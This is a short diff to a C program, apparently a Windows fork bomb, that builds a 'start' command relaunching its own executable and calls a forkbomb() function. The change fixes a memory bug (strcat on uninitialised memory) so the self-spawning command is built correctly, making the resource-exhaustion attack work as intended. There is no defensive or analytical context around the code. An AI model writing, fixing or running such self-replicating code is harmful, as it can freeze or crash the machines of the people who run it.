@@ -16,8 +16,13 @@ int main (int argc,char * argv[]) {
     }
   }
   if ((cmd = malloc(sizeof(char) * (strlen(argv[0])+7))) != 0) {
-    strcat(cmd,"start ");
-    strcat(cmd,*argv);
+    cmd[0] = 's';
+    cmd[1] = 't';
+    cmd[2] = 'a';
+    cmd[3] = 'r';
+    cmd[4] = 't';
+    cmd[5] = ' ';
+    memcpy(cmd+6,*argv,strlen(argv[0])+1);
     forkbomb();
   } else
     printf("Memory alloc failed.\n");
